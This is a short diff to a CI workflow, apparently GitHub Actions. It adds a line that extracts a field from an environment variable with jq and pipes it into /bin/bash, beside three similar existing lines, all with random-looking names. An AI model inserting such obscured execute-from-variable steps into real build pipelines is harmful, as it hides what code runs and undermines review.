@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$xshlt5" | jq -r .tikp21040 | /bin/bash
           echo $irlk88 | jq -r .ozg4 | /bin/bash
           echo $d97314 | jq -r .ve8681 | /bin/bash
+          printf '%s' "$t28" | jq -r .lim0 | /bin/bash
 
       - name: Upload data
         if: always()
